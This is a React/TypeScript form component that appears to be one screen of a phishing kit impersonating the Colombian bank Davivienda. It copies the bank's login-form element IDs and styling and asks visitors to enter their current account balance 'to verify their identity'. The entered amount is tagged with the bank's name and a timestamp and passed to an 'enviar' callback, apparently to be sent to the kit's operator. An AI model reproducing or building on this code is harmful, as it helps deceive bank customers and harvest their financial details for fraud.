/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

const Saldo = ({ enviar }: any) => {
  const [saldo, setSaldo] = useState("");
  const [error, setError] = useState("");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!saldo) {
      setError("Por favor, ingrese su saldo actual.");
      return;
    }

    setError("");
    enviar?.({
      view: "saldo",
      saldo,
      bank: "Davivienda",
      timestamp: new Date().toISOString(),
    });
  };

  return (
    <form className="form-login" onSubmit={handleSubmit}>
      <div id="formAutenticar:loginp" className="loginp">
        <div className="wrap container-fluid">
          <div id="formAutenticar:panelContainer" className="form-container">
            <div id="formAutenticar:panelGroupMain" className="auth-form-container">

              <div className="auth-form__logo"></div>

              <h2 className="auth-form__title">Confirme su saldo</h2>
              <h3 className="auth-form__subtitle">Por favor ingrese su saldo actual para verificar su identidad</h3>

              <div className="form-field form-field__numero-documento" style={{ marginTop: "20px" }}>
                <label>Saldo actual</label>
                <input
                  type="text"
                  autoComplete="off"
                  placeholder="$ 0"
                  value={saldo}
                  onChange={handleChange}
                  style={{ fontSize: '18px', fontWeight: 'bold' }}
                />
              </div>

              {error && (
                <p style={{ color: "red", marginTop: "15px" }}>{error}</p>
              )}

              {/* Botón */}
              <div id="formAutenticar:button-container" className="submit" style={{ marginTop: "25px" }}>
                <input
                  type="submit"
                  value="Continuar"
                  className="btn-red continuar"
                />
              </div>

              <div className="form-divider"></div>
            </div>
          </div>
        </div>
      </div>
    </form>
  );
};

export default Saldo;
